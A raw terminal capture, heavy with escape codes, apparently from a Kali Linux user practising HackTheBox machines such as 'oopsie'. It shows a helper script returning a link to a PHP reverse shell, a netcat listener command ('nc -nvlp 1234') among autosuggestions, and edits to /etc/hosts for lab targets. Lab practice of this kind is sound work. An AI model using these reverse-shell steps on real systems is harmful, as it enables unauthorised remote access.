+└─[1m[32m[34m$[0m[34m[39m [32m./hh[39m[38;2;153;153;153m php[39m[K[39m [39m[4mr[24m[39m [39m [4mr[4me[24m[4me[4mv[24m[4mv[4me[24m[4me[4mr[24m[4mr[4ms[24m[24mr[24me[24mv[24me[24mr[24mshe-  [4mr[4me[4mv[4me[4mr[4ms[24m [4ms[4me[24m[?1l>[?2004l[24mr[24me[24mv[24me[24mr[24ms[24me
+/home/kali/oopsie.md:https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32m./hh[39m [4mreverse[24m[24mr[24me[24mv[24me[24mr[24ms[24me-shell[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [32m./hh[39m reverse-shell[K[?1l>[?2004l
+/home/kali/oopsie.md:https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32ml[39m[32ml[39m[38;2;153;153;153ms[39m[32ml[32ms[39m[?1l>[?2004l
+[0m[01;34masmpractice[0m  [01;34mDownloads[0m       [01;34mhackin9[0m     [01;34mhtbExplorer-master[0m  [01;34mmaquinas[0m   [01;34mnmap[0m      [01;34mpdf[0m   [01;34mreversetabnabbing[0m  [01;34mtelecom[0m
+[01;34mbin[0m          [01;34mexploting[0m       [01;34mhackthebox[0m  [01;34mironhackers[0m         [01;34mmongo[0m      [01;32mnmap.sh[0m   [01;34mpeda[0m  [01;34mricardonarvaja[0m     [01;34mtesting[0m
+[01;34mbindshell[0m    [01;34mguiadeexploits[0m  [01;32mhh[0m          [01;34mmanuales[0m            [01;34mmortadelo[0m  notas.md  [01;34mphp[0m   [01;34mshellcodetester[0m    [01;34mwhireshark[0m
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[32mls[39m[32m.[32m/[32mhh[39m reverse-shell[?1l>[?2004l
+/home/kali/oopsie.md:https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[A[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [A[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [A[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [4mn[24m[4mn[24m[38;2;153;153;153mc -nvlp 1234[39m[12D[24m[1m[31mn[1m[31ma[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[38;2;153;153;153mno php-reverse-shell.php[39m[24D[1m[31mn[1m[31ma[1m[31mn[0m[39m[0m[32mn[0m[32ma[0m[32mn[32mo[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [22D[38;2;153;153;153m php-reverse-shell.php[39m[22D[1m[31mn[1m[31ma[1m[31mn[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [23D[38;2;153;153;153mo php-reverse-shell.php[39m[23D[1m[31mn[1m[31ma[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [24D[38;2;153;153;153mno php-reverse-shell.php[39m[24D[0m[39m[4mn[24m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [25D[4mn[24m[38;2;153;153;153mc -nvlp 1234[39m[12D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [13D[4ms[24m[4ms[24m[38;2;153;153;153mudo apt-get install mongodb-clients[39m[35D[24m[32ms[32mu[39m[1m[31ms[1m[31mu[1m[31md[0m[39m[0m[4m[32ms[0m[4m[32mu[0m[4m[32md[4m[32mo[24m[39m[39m [39m[4mn[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [30D[38;2;153;153;153metdiscover -i wlan0[39m[19D[24m[1m[31mn[1m[31ma[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [18D[38;2;153;153;153mno /etc/hosts[39m[13D[1m[31ma[1m[31mn[0m[39m[0m[32mn[0m[32ma[0m[32mn[32mo[39m[39m [39m[4m/[39m[4me[39m[4mt[39m[4mc[39m[4m/[39m[4mh[39m[4mo[39m[4ms[39m[4mt[39m[4ms[24m[?1l>[?2004l
+[?2004h[?1049h[22;0;0t[1;41r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[39;77H(B[0;7m[ Reading... ](B[m[39;76H(B[0;7m[ Read 9 lines ](B[m[H(B[0;7m  GNU nano 6.0                                                                   /etc/hosts                                                                            [1;166H(B[m[40d(B[0;7m^G(B[m Help[40;17H(B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut[40;65H(B[0;7m^T(B[m Execute[81G(B[0;7m^C(B[m Location     (B[0;7mM-U(B[m Undo[40;113H(B[0;7mM-A(B[m Set Mark    (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[41d(B[0;7m^X(B[m Exit[41;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste[41;65H(B[0;7m^J(B[m Justify[81G(B[0;7m^/(B[m Go To Line   (B[0;7mM-E(B[m Redo[41;113H(B[0;7mM-6(B[m Copy[41;129H(B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[2d127.0.0.1[16Glocalhost kali[3d::1[3;17Hlocalhost ip6-localhost ip6-loopback[4dfe00::0[4;17Hip6-localnet[5dff00::0[5;17Hip6-mcastprefix[6dff02::1[6;17Hip6-allnodes[7dff02::2[7;17Hip6-allrouters[8d10.129.172.82   archetype[9d127.0.0.1[17Ghtb.hackthebox.eu[10d10.129.172.19   oopsie[2d[?12l[?25h[?25l[?12l[?25h[3d[?25l[?12l[?25h[4d[?25l[?12l[?25h[5d[?25l[?12l[?25h[6d[?25l[?12l[?25h[7d[?25l[?12l[?25h[8d[?25l[?12l[?25h[9d[?25l[?12l[?25h[10d[?25l[?12l[?25h1[?25l[?12l[?25h0[?25l[?12l[?25h.[?25l[?12l[?25h1[?25l[?12l[?25h2[?25l[?12l[?25h9[?25l[?12l[?25h.[?25l[?12l[?25h1[?25l[?12l[?25h7[?25l[?12l[?25h2[?25l[?12l[?25h.[?25l[39d[K[?12l[?25h[10;13H[?25l[?12l[?25h9[?25l[1;93H(B[0;7m*[166G(B[m[?12l[?25h[10;13H[1P[?25l[?12l[?25h[2P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h1   oopsie[10;9H[?25l[?12l[?25h6   oopsie[10;10H[?25l[?12l[?25h4   oopsie[10;11H[?25l[?12l[?25h.   oopsie[10;12H[?25l[?12l[?25h1   oopsie[10;13H[?25l[?12l[?25h9   oopsie[10;14H[?25l[?12l[?25h4   oopsie[10;15H[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h5  oopsie[10;15H[?25l[40;17H[25X[40;42H(B[0;7mM-D(B[m DOS Format[40;65H          [81G  (B[0;7mM-A(B[m Append            [40;113H           (B[0;7mM-B(B[m Backup File[K[41;2H(B[0;7mC(B[m Cancel[17G[25X[41;42H(B[0;7mM-M(B[m Mac Format [41;65H          [81G  (B[0;7mM-P(B[m Prepend           [41;113H           (B[0;7m^T(B[m Browse[K[39d(B[0;7mFile Name to Write: /etc/hosts                                                                                                                                         [39;31H(B[m[?12l[?25h[?25l[39;76H[1K (B[0;7m[ Writing... ](B[m[K[1;93H(B[0;7m [166G(B[m[39;76H(B[0;7m[ Wrote 9 lines ](B[m[40;17H(B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut [40;65H(B[0;7m^T(B[m Execute[81G(B[0;7m^C(B[m Location     (B[0;7mM-U(B[m Undo[40;113H(B[0;7mM-A(B[m Set Mark    (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[41;2H(B[0;7mX(B[m Exit  [17G(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace      (B[0;7m^U(B[m Paste[41;65H(B[0;7m^J(B[m Justify[81G(B[0;7m^/(B[m Go To Line   (B[0;7mM-E(B[m Redo[41;113H(B[0;7mM-6(B[m Copy        (B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[?12l[?25h[10;15H[?25l[?12l[?25h[11d[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[10;15H[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[39d[K[?12l[?25h[3;15H[?25l[?12l[?25h[4d[?25l[?12l[?25h[5d[?25l[?12l[?25h[6d[?25l[?12l[?25h[7d[?25l[?12l[?25h[8d[?25l[?12l[?25h[9d[?25l[?12l[?25h[10d[?25l[?12l[?25h[11d[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[40;17H[25X[40;42H(B[0;7mM-D(B[m DOS Format[40;65H          [81G  (B[0;7mM-A(B[m Append            [40;113H           (B[0;7mM-B(B[m Backup File[K[41;2H(B[0;7mC(B[m Cancel[17G[25X[41;42H(B[0;7mM-M(B[m Mac Format [41;65H          [81G  (B[0;7mM-P(B[m Prepend           [41;113H           (B[0;7m^T(B[m Browse[K[39d(B[0;7mFile Name to Write: /etc/hosts                                                                                                                                         [39;31H(B[m[?12l[?25h[?25l[39;76H[1K (B[0;7m[ Writing... ](B[m[K[1;166H[39;76H(B[0;7m[ Wrote 9 lines ](B[m[40;17H(B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut [40;65H(B[0;7m^T(B[m Execute[81G(B[0;7m^C(B[m Location     (B[0;7mM-U(B[m Undo[40;113H(B[0;7mM-A(B[m Set Mark    (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[41;2H(B[0;7mX(B[m Exit  [17G(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace      (B[0;7m^U(B[m Paste[41;65H(B[0;7m^J(B[m Justify[81G(B[0;7m^/(B[m Go To Line   (B[0;7mM-E(B[m Redo[41;113H(B[0;7mM-6(B[m Copy        (B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[?12l[?25h[11d[?25l[39;54H(B[0;7m[ line 10/10 (100%), col  1/ 1 (100%), char 287/287 (100%) ](B[m[?12l[?25h[11d[?25l[39d[J[41d[?12l[?25h[41;1H[?1049l[23;0;0t[?1l>[?2004l 
